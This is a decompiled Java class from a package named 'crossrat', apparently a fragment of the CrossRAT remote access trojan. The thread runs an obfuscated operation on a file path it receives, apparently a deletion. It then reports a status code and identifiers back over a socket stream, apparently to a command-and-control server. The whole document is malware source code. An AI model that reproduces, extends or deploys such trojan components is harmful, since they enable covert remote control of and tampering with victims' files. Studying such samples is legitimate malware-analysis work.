package crossrat;

import java.io.DataOutputStream;
import java.io.File;

final class b extends Thread {
   private String a;
   private boolean b;
   private String c;

   public b(String var1, String var2) {
      this.a = var1;
      this.c = var2;
   }

   public final void run() {
      File var1 = new File(this.a);
      DataOutputStream var2 = null;

      try {
         var2 = new DataOutputStream(k.k.getOutputStream());
      } catch (Exception var5) {
         var5.printStackTrace();
      }

      String var6;
      if (var1.exists()) {
         this.b = org.a.a.a.b.a(var1);
         if (this.b) {
            var6 = "1";
         } else {
            var6 = "0";
         }
      } else {
         var6 = "2";
      }

      try {
         var2.writeBytes(k.g + k.d + k.E + k.d + var6 + k.d + this.c + k.d + "&&&");
      } catch (Exception var4) {
         var4.printStackTrace();
      }
   }
}
